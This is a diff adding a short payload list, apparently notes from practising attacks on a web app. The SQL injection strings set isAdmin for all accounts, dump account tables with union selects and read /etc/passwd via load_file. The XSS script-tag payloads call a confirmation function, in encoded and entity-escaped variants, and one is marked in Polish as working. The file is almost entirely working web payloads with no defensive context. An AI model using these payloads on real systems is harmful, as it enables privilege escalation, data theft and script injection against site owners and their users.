@@ -1,0 +1,30 @@
+------ SQL injection -----
+paul';UPDATE accounts SET isAdmin='1' WHERE isAdmin='0';SELECT * FROM accounts WHERE name='
+paul';UPDATE accounts SET isAdmin='1' WHERE name='steve
+(UPDATE history SET name='paul')') #
+
+paul' union select from accounts
+paul' union select load_file('etc/passwd'),2--
+1=1
+
+"' -- "
+%27%20--%20
+paul%27or%20name=%27steve%27%20--%20
+paul%27%20union%20select%20*,%20null%20from%20accounts%20--%201
+
+------- XSS, XSRF --------
+&lt;script&gt;alert('TEST')&lt;/script&gt;
+&lt;script&gt;potwierdz(100)&lt;/script&gt;
+
+<script>$('document').ready(function(){potwierdz(100)});</script>
+<   script>   $('document').ready(function(){     potwierdz(100)}     );<   /script>
+&lt;script&gt;$('document').ready(function()&#123;potwierdz(100)&#125;);&lt;/script&gt;
+
+<script>alert(window.jQuery)</script>
+
+<script>document.addEventListener("DOMContentLoaded",function(event){alert('hey');});</script>
+&lt;script&gt;document.addEventListener(&#34;DOMContentLoaded&#34;,function(event){alert('hey');});&lt;/script&gt;
+&lt;script&gt;document.addEventListener(&#34;DOMContentLoaded&#34;,function(event){potwierdz(100)});&lt;/script&gt;
+
+### to działa
+&lt;script&gt;potwierdz(99);&lt;/script&gt;
